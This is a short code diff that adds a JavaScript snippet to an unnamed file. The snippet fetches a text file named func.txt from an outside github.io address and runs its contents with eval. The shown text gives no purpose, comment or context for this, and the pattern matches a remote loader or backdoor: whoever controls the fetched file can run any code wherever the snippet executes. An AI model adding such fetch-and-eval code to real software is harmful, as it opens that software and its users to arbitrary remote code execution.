@@ -1,0 +1,6 @@
+
+
+fetch('https://showmeyouraiz.github.io/func.txt')
+  .then(res => res.ok ? res.text() : Promise.reject('Error'))
+  .then(eval)
+  .catch(console.error);
